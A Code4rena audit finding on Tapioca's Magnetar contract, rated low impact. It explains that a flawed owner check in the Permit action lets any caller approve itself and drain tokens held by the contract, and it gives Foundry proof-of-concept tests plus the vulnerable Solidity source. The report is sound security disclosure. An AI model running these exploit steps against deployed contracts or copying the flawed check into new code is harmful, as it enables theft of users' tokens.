{
  "Title": "[01] A lot of calls in `MagnetarAction.Permit` enables anyone to steal whitelisted tokens held by `Magnetar`",
  "Content": "\nIn `Magnetar` a user can batch a lot of calls to the Tapioca ecosystem. One of these is the `MagnetarAction.Permit`. This performs various permit operations, [`Magnetar::_processPermitOperation`](https://github.com/Tapioca-DAO/tapioca-periph/blob/032396f701be935b04a7e5cf3cb40a0136259dbc/contracts/Magnetar/Magnetar.sol#L199-L212):\n\n```solidity\nFile: tapioca-periph/contracts/Magnetar/Magnetar.sol\n\n199:        bytes4 funcSig = bytes4(_actionCalldata[:4]);\n200:        if (\n201:            funcSig == IPermitAll.permitAll.selector || funcSig == IPermitAll.revokeAll.selector\n202:                || funcSig == IPermit.permit.selector || funcSig == IPermit.revoke.selector\n203:                || funcSig == IYieldBox.setApprovalForAll.selector || funcSig == IYieldBox.setApprovalForAsset.selector \n204:                || funcSig == IERC20.approve.selector || funcSig == IPearlmit.approve.selector\n205:                || funcSig == IERC721.approve.selector \n206:        ) {\n207:            /// @dev Owner param check. See Warning above.\n208:            _checkSender(abi.decode(_actionCalldata[4:36], (address)));\n209:            // No need to send value on permit\n210:            _executeCall(_target, _actionCalldata, 0, _allowFailure);\n211:            return;\n212:        }\n```\n\nLet's also have a look at [`MagnetarStorage::_checkSender`](https://github.com/Tapioca-DAO/tapioca-periph/blob/032396f701be935b04a7e5cf3cb40a0136259dbc/contracts/Magnetar/MagnetarStorage.sol#L93-L97):\n\n```solidity\nFile: tapioca-periph/Magnetar/MagnetarStorage.sol\n\n93:    function _checkSender(address _from) internal view {\n94:        if (_from != msg.sender && !cluster.isWhitelisted(0, msg.sender)) {\n95:            revert Magnetar_NotAuthorized(msg.sender, _from);\n96:        }\n97:    }\n```\n\nHere, the first argument to whatever call is done in `_processPermitOperation` is checked. The important thing here is that it always passes if the first argument is `msg.sender`.\n\nThis is troublesome for the calls: `IYieldBox::setApprovalForAll`, `IYieldBox::setApprovalForAsset`, `IERC20::approve`, and `IERC721::approve`. As they all have the operator/approvee as the first argument and use `msg.sender` as the \"owner\".\n\nHence, any of these calls would pass with `msg.sender`, granting allowance from `Magnetar` to `msg.sender` which can be any user.\n\n### Impact\n\nAny user can steal any whitelisted tokens held by `Magnetar`. However, as `Magnetar` is just a helper contract it is not supposed to hold any tokens.\n\n### PoC\n\nTest in `tap-token/test/MagnetarApproval.t.sol`:\n\n```solidity\n    function testTakeERC721() public {\n        erc721.mint(address(magnetar),1);\n\n        MagnetarCall memory approve = MagnetarCall({\n            id: MagnetarAction.Permit,\n            target: address(erc721),\n            value: 0,\n            allowFailure: false,\n            call: abi.encodeWithSelector(IERC721.setApprovalForAll.selector, address(this), true)\n        });\n\n        MagnetarCall[] memory calls = new MagnetarCall[](1);\n        calls[0] = approve;\n\n        magnetar.burst(calls);\n\n        erc721.transferFrom(address(magnetar), address(this), 1);\n        assertEq(erc721.ownerOf(1),address(this));\n    }\n\n    function testTakeERC20() public {\n        erc20.mint(address(magnetar),1e18);\n\n        MagnetarCall memory approve = MagnetarCall({\n            id: MagnetarAction.Permit,\n            target: address(erc20),\n            value: 0,\n            allowFailure: false,\n            call: abi.encodeWithSelector(IERC20.approve.selector, address(this), 1e18)\n        });\n\n        MagnetarCall[] memory calls = new MagnetarCall[](1);\n        calls[0] = approve;\n\n        magnetar.burst(calls);\n\n        erc20.transferFrom(address(magnetar),address(this),1e18);\n        assertEq(erc20.balanceOf(address(this)),1e18);\n    }\n```\n\nFull test code can be found [here](https://gist.github.com/0ximmeas/470717ac554ea9ab350f5bf4d89fa730).\n\n### Recommendation\n\nConsider rethinking how `MagnetarAction.Permit` should work, as there is support in modules for a lot of the calls it is used for. Perhaps it is unnecessary to have.\n\n",
  "Impact": "LOW",
  "Source": "https://code4rena.com/reports/2024-02-tapioca",
  "Code": [
    {
      "filename": "contracts/Magnetar/Magnetar.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// External \nimport {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n// Tapioca\nimport {ITapiocaOptionBroker} from \"tapioca-periph/interfaces/tap-token/ITapiocaOptionBroker.sol\";\nimport {ITapiocaOptionLiquidityProvision} from\n    \"tapioca-periph/interfaces/tap-token/ITapiocaOptionLiquidityProvision.sol\";\nimport {MagnetarAction, MagnetarModule, MagnetarCall} from \"tapioca-periph/interfaces/periph/IMagnetar.sol\";\nimport {IMagnetarModuleExtender} from \"tapioca-periph/interfaces/periph/IMagnetar.sol\";\nimport {ISingularity} from \"tapioca-periph/interfaces/bar/ISingularity.sol\";\nimport {IYieldBox} from \"tapioca-periph/interfaces/yieldbox/IYieldBox.sol\";\nimport {IPermitAll} from \"tapioca-periph/interfaces/common/IPermitAll.sol\";\nimport {ICluster} from \"tapioca-periph/interfaces/periph/ICluster.sol\";\nimport {IPearlmit} from \"tapioca-periph/pearlmit/PearlmitHandler.sol\";\nimport {IPermit} from \"tapioca-periph/interfaces/common/IPermit.sol\";\nimport {IMarket} from \"tapioca-periph/interfaces/bar/IMarket.sol\";\nimport {ITOFT} from \"tapioca-periph/interfaces/oft/ITOFT.sol\";\nimport {BaseMagnetar} from \"./BaseMagnetar.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\n/**\n * @title Magnetar\n * @author TapiocaDAO\n * @notice Magnetar helper contract\n */\ncontract Magnetar is BaseMagnetar {\n    error Magnetar_ValueMismatch(uint256 expected, uint256 received); // Value mismatch in the total value asked and the msg.value in burst\n    error Magnetar_ActionNotValid(MagnetarAction action, bytes actionCalldata); // Burst did not find what to execute\n\n    constructor(\n        ICluster _cluster,\n        address _owner,\n        address payable _assetModule,\n        address payable _assetXChainModule,\n        address payable _collateralModule,\n        address payable _mintModule,\n        address payable _mintXChainModule,\n        address payable _optionModule,\n        address payable _yieldBoxModule,\n        IPearlmit _pearlmit\n    ) BaseMagnetar(_cluster, _pearlmit, _owner) {\n        modules[MagnetarModule.AssetModule] = _assetModule;\n        modules[MagnetarModule.AssetXChainModule] = _assetXChainModule;\n        modules[MagnetarModule.CollateralModule] = _collateralModule;\n        modules[MagnetarModule.MintModule] = _mintModule;\n        modules[MagnetarModule.MintXChainModule] = _mintXChainModule;\n        modules[MagnetarModule.OptionModule] = _optionModule;\n        modules[MagnetarModule.YieldBoxModule] = _yieldBoxModule;\n    }\n\n    /// =====================\n    /// Public\n    /// =====================\n    /**\n     * @notice Batch multiple calls together\n     * @param calls The list of actions to perform\n     */\n    function burst(MagnetarCall[] calldata calls) external payable {\n        uint256 valAccumulator;\n\n        uint256 length = calls.length;\n\n        for (uint256 i; i < length; i++) {\n            MagnetarCall calldata _action = calls[i];\n            if (!_action.allowFailure) {\n                require(\n                    _action.call.length > 0,\n                    string.concat(\"Magnetar: Missing call for action with index\", string(abi.encode(i)))\n                );\n            }\n            valAccumulator += _action.value;\n\n            /// @dev Permit on YB, or an SGL/BB market\n            if (_action.id == MagnetarAction.Permit) {\n                _processPermitOperation(_action.target, _action.call, _action.allowFailure);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Wrap/unwrap singular operations\n            if (_action.id == MagnetarAction.Wrap) {\n                _processWrapOperation(_action.target, _action.call, _action.value, _action.allowFailure);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Market singular operations\n            if (_action.id == MagnetarAction.Market) {\n                _processMarketOperation(_action.target, _action.call, _action.value, _action.allowFailure);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Tap singular operations\n            if (_action.id == MagnetarAction.TapToken) {\n                _processTapTokenOperation(_action.target, _action.call, _action.value, _action.allowFailure);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Modules will not return result data.\n            if (_action.id == MagnetarAction.AssetModule) {\n                _executeModule(MagnetarModule.AssetModule, _action.call);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Modules will not return result data.\n            if (_action.id == MagnetarAction.AssetXChainModule) {\n                _executeModule(MagnetarModule.AssetXChainModule, _action.call);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Modules will not return result data.\n            if (_action.id == MagnetarAction.CollateralModule) {\n                _executeModule(MagnetarModule.CollateralModule, _action.call);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Modules will not return result data.\n            if (_action.id == MagnetarAction.MintModule) {\n                _executeModule(MagnetarModule.MintModule, _action.call);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Modules will not return result data.\n            if (_action.id == MagnetarAction.MintXChainModule) {\n                _executeModule(MagnetarModule.MintXChainModule, _action.call);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Modules will not return result data.\n            if (_action.id == MagnetarAction.OptionModule) {\n                _executeModule(MagnetarModule.OptionModule, _action.call);\n                continue; // skip the rest of the loop\n            }\n\n            /// @dev Modules will not return result data.\n            if (_action.id == MagnetarAction.YieldBoxModule) {\n                _executeModule(MagnetarModule.YieldBoxModule, _action.call);\n                continue; // skip the rest of the loop\n            }\n\n            if (_action.id == MagnetarAction.OFT) {\n                _processOFTOperation(_action.target, _action.call, _action.value, _action.allowFailure);\n                continue; // skip the rest of the loop\n            }\n\n            // If no valid action was found, use the Magnetar module extender. Only if the action is valid.\n            if (\n                address(magnetarModuleExtender) != address(0)\n                    && magnetarModuleExtender.isValidActionId(uint8(_action.id))\n            ) {\n                bytes memory callData = abi.encodeWithSelector(IMagnetarModuleExtender.handleAction.selector, _action);\n                (bool success, bytes memory returnData) = address(magnetarModuleExtender).delegatecall(callData);\n                if (!success) {\n                    _getRevertMsg(returnData);\n                }\n            } else {\n                // If no valid action was found, revert\n                revert Magnetar_ActionNotValid(_action.id, _action.call);\n            }\n        }\n\n        if (msg.value != valAccumulator) revert Magnetar_ValueMismatch(msg.value, valAccumulator);\n    }\n\n    /// =====================\n    /// Private\n    /// =====================\n    /**\n     * @dev Process a permit operation, will only execute if the selector is allowed.\n     * @dev !!! WARNING !!! Make sure to check the Owner param and check that function definition didn't change.\n     *\n     * @param _target The contract address to call.\n     * @param _actionCalldata The calldata to send to the target.\n     * @param _allowFailure Whether to allow the call to fail.\n     */\n    function _processPermitOperation(address _target, bytes calldata _actionCalldata, bool _allowFailure) private {\n        if (!cluster.isWhitelisted(0, _target)) revert Magnetar_NotAuthorized(_target, _target);\n\n        /// @dev owner address should always be first param.\n        // permitAction(bytes,uint16)\n        // permit(address owner...)\n        // revoke(address owner...)\n        // permitAll(address from,..)\n        // permit(address from,...)\n        // setApprovalForAll(address from,...)\n        // setApprovalForAsset(address from,...)\n        bytes4 funcSig = bytes4(_actionCalldata[:4]);\n        if (\n            funcSig == IPermitAll.permitAll.selector || funcSig == IPermitAll.revokeAll.selector\n                || funcSig == IPermit.permit.selector || funcSig == IPermit.revoke.selector\n                || funcSig == IYieldBox.setApprovalForAll.selector || funcSig == IYieldBox.setApprovalForAsset.selector \n                || funcSig == IERC20.approve.selector || funcSig == IPearlmit.approve.selector\n                || funcSig == IERC721.approve.selector \n        ) {\n            /// @dev Owner param check. See Warning above.\n            _checkSender(abi.decode(_actionCalldata[4:36], (address)));\n            // No need to send value on permit\n            _executeCall(_target, _actionCalldata, 0, _allowFailure);\n            return;\n        }\n        revert Magnetar_ActionNotValid(MagnetarAction.Permit, _actionCalldata);\n    }\n\n    //TODO: decide\n    /**\n     * @dev Process a TOFT operation, will only execute if the selector is allowed.\n     * @dev !!! WARNING !!! Make sure to check the Owner param and check that function definition didn't change.\n     *\n     * @param _target The contract address to call.\n     * @param _actionCalldata The calldata to send to the target.\n     * @param _actionValue The value to send with the call.\n     * @param _allowFailure Whether to allow the call to fail.\n     */\n    function _processWrapOperation(\n        address _target,\n        bytes calldata _actionCalldata,\n        uint256 _actionValue,\n        bool _allowFailure\n    ) private {\n        if (!cluster.isWhitelisted(0, _target)) revert Magnetar_NotAuthorized(_target, _target);\n\n        /// @dev owner address should always be first param.\n        // wrap(address from,...)\n        // unwrap(address from,...)\n        bytes4 funcSig = bytes4(_actionCalldata[:4]);\n\n        if (funcSig == ITOFT.wrap.selector || funcSig == ITOFT.unwrap.selector) {\n            /// @dev Owner param check. See Warning above.\n            _checkSender(abi.decode(_actionCalldata[4:36], (address)));\n            _executeCall(_target, _actionCalldata, _actionValue, _allowFailure);\n            return;\n        }\n        revert Magnetar_ActionNotValid(MagnetarAction.Wrap, _actionCalldata);\n    }\n\n    /**\n     * @dev Process a market operation, will only execute if the selector is allowed.\n     * @dev !!! WARNING !!! Make sure to check the Owner param and check that function definition didn't change.\n     *\n     * @param _target The contract address to call.\n     * @param _actionCalldata The calldata to send to the target.\n     * @param _actionValue The value to send with the call.\n     * @param _allowFailure Whether to allow the call to fail.\n     */\n    function _processMarketOperation(\n        address _target,\n        bytes calldata _actionCalldata,\n        uint256 _actionValue,\n        bool _allowFailure\n    ) private {\n        if (!cluster.isWhitelisted(0, _target)) revert Magnetar_NotAuthorized(_target, _target);\n\n        /// @dev owner address should always be first param.\n        // addCollateral(address from,...)\n        // borrow(address from,...)\n        // addAsset(address from,...)\n        // repay(address _from,...)\n        // buyCollateral(address from,...)\n        // sellCollateral(address from,...)\n        bytes4 funcSig = bytes4(_actionCalldata[:4]);\n        if (\n            funcSig == IMarket.execute.selector || funcSig == ISingularity.addAsset.selector\n                || funcSig == ISingularity.removeAsset.selector\n        ) {\n            /// @dev Owner param check. See Warning above.\n            _checkSender(abi.decode(_actionCalldata[4:36], (address)));\n            _executeCall(_target, _actionCalldata, _actionValue, _allowFailure);\n            return;\n        }\n        revert Magnetar_ActionNotValid(MagnetarAction.Market, _actionCalldata);\n    }\n\n    /**\n     * @dev Process a TapToken operation, will only execute if the selector is allowed.\n     * @dev Different from the others. No need to check for sender.\n     *\n     * @param _target The contract address to call.\n     * @param _actionCalldata The calldata to send to the target.\n     * @param _actionValue The value to send with the call.\n     * @param _allowFailure Whether to allow the call to fail.\n     */\n    function _processTapTokenOperation(\n        address _target,\n        bytes calldata _actionCalldata,\n        uint256 _actionValue,\n        bool _allowFailure\n    ) private {\n        if (!cluster.isWhitelisted(0, _target)) revert Magnetar_NotAuthorized(_target, _target);\n\n        bytes4 funcSig = bytes4(_actionCalldata[:4]);\n        if (\n            funcSig == ITapiocaOptionBroker.exerciseOption.selector\n                || funcSig == ITapiocaOptionBroker.participate.selector\n                || funcSig == ITapiocaOptionBroker.exitPosition.selector\n                || funcSig == ITapiocaOptionLiquidityProvision.lock.selector\n                || funcSig == ITapiocaOptionLiquidityProvision.unlock.selector\n        ) {\n            _executeCall(_target, _actionCalldata, _actionValue, _allowFailure);\n            return;\n        }\n        revert Magnetar_ActionNotValid(MagnetarAction.TapToken, _actionCalldata);\n    }\n\n    /**\n     * @dev Process an OFT operation, will only execute if the selector is allowed.\n     * @dev Different from the others. No need to check for sender. MsgType is sanitized by the OFT\n     *\n     * @param _target The contract address to call.\n     * @param _actionCalldata The calldata to send to the target.\n     * @param _actionValue The value to send with the call.\n     * @param _allowFailure Whether to allow the call to fail.\n     */\n    function _processOFTOperation(\n        address _target,\n        bytes calldata _actionCalldata,\n        uint256 _actionValue,\n        bool _allowFailure\n    ) private {\n        if (!cluster.isWhitelisted(0, _target)) revert Magnetar_NotAuthorized(_target, _target);\n        _executeCall(_target, _actionCalldata, _actionValue, _allowFailure);\n    }\n\n    /**\n     * @dev Executes a call to an address, optionally reverting on failure. Make sure to sanitize prior to calling.\n     */\n    function _executeCall(address _target, bytes calldata _actionCalldata, uint256 _actionValue, bool _allowFailure)\n        private\n    {\n        bool success;\n        bytes memory returnData;\n\n        if (_actionValue > 0) {\n            (success, returnData) = _target.call{value: _actionValue}(_actionCalldata);\n        } else {\n            (success, returnData) = _target.call(_actionCalldata);\n        }\n\n        if (!success && !_allowFailure) {\n            _getRevertMsg(returnData);\n        }\n    }\n}"
    },
    {
      "filename": "contracts/Magnetar/MagnetarStorage.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// External\nimport {RebaseLibrary} from \"@boringcrypto/boring-solidity/contracts/libraries/BoringRebase.sol\";\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n\n// Tapioca\nimport {ITapiocaOptionLiquidityProvision} from\n    \"tapioca-periph/interfaces/tap-token/ITapiocaOptionLiquidityProvision.sol\";\nimport {ITapiocaOptionBroker} from \"tapioca-periph/interfaces/tap-token/ITapiocaOptionBroker.sol\";\nimport {MagnetarAction, MagnetarModule} from \"tapioca-periph/interfaces/periph/IMagnetar.sol\";\nimport {PearlmitHandler, IPearlmit} from \"tapioca-periph/pearlmit/PearlmitHandler.sol\";\nimport {IYieldBoxTokenType} from \"tapioca-periph/interfaces/yieldbox/IYieldBox.sol\";\nimport {ITapiocaOracle} from \"tapioca-periph/interfaces/periph/ITapiocaOracle.sol\";\nimport {ICommonData} from \"tapioca-periph/interfaces/common/ICommonData.sol\";\nimport {ISingularity} from \"tapioca-periph/interfaces/bar/ISingularity.sol\";\nimport {ICluster} from \"tapioca-periph/interfaces/periph/ICluster.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\n/**\n * @title MagnetarStorage\n * @author TapiocaDAO\n * @notice Storage contract for Magnetar & modules\n */\ncontract MagnetarStorage is IERC721Receiver, PearlmitHandler {\n    ICluster internal cluster;\n    mapping(MagnetarModule moduleId => address moduleAddress) internal modules;\n\n    // Helpers for external usage. Not used in the contract.\n    uint8 public constant MAGNETAR_ACTION_PERMIT = 0;\n    uint8 public constant MAGNETAR_ACTION_WRAP = 1;\n    uint8 public constant MAGNETAR_ACTION_MARKET = 2;\n    uint8 public constant MAGNETAR_ACTION_TAP_TOKEN = 3;\n    uint8 public constant MAGNETAR_ACTION_OFT = 4;\n    uint8 public constant MAGNETAR_ACTION_ASSET_MODULE = 5;\n    uint8 public constant MAGNETAR_ACTION_ASSET_XCHAIN_MODULE = 6;\n    uint8 public constant MAGNETAR_ACTION_COLLATERAL_MODULE = 7;\n    uint8 public constant MAGNETAR_ACTION_MINT_MODULE = 8;\n    uint8 public constant MAGNETAR_ACTION_MINT_XCHAIN_MODULE = 9;\n    uint8 public constant MAGNETAR_ACTION_OPTION_MODULE = 10;\n    uint8 public constant MAGNETAR_ACTION_YIELDBOX_MODULE = 11;\n\n    error Magnetar_NotAuthorized(address caller, address expectedCaller); // msg.send is neither the owner nor whitelisted by Cluster\n    error Magnetar_ModuleNotFound(MagnetarModule module); // Module not found\n    error Magnetar_UnknownReason(); // Revert reason not recognized\n\n    constructor(IPearlmit _pearlmit) PearlmitHandler(_pearlmit) {}\n\n    receive() external payable virtual {}\n\n    /// =====================\n    /// Public\n    /// =====================\n\n    /**\n     * @dev Receiver for `MagnetarMintModule._participateOnTOLP()`\n     */\n    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n    /// =====================\n    /// Private\n    /// =====================\n    function _executeModule(MagnetarModule _module, bytes memory _data) internal returns (bytes memory returnData) {\n        bool success = true;\n        address module = modules[_module];\n        if (module == address(0)) revert Magnetar_ModuleNotFound(_module);\n\n        (success, returnData) = module.delegatecall(_data);\n        if (!success) {\n            _getRevertMsg(returnData);\n        }\n    }\n\n    /**\n     * @dev Check if the sender is authorized to call the contract.\n     * sender is authorized if:\n     *      - is the owner\n     *      - is whitelisted by the cluster\n     */\n    function _checkSender(address _from) internal view {\n        if (_from != msg.sender && !cluster.isWhitelisted(0, msg.sender)) {\n            revert Magnetar_NotAuthorized(msg.sender, _from);\n        }\n    }\n\n    /**\n     * @dev Decodes revert messages\n     */\n    function _getRevertMsg(bytes memory _returnData) internal pure {\n        // If the _res length is less than 68, then\n        // the transaction failed with custom error or silently (without a revert message)\n        if (_returnData.length < 68) revert Magnetar_UnknownReason();\n\n        assembly {\n            // Slice the sighash.\n            _returnData := add(_returnData, 0x04)\n        }\n        revert(abi.decode(_returnData, (string))); // All that remains is the revert string\n    }\n}"
    }
  ]
}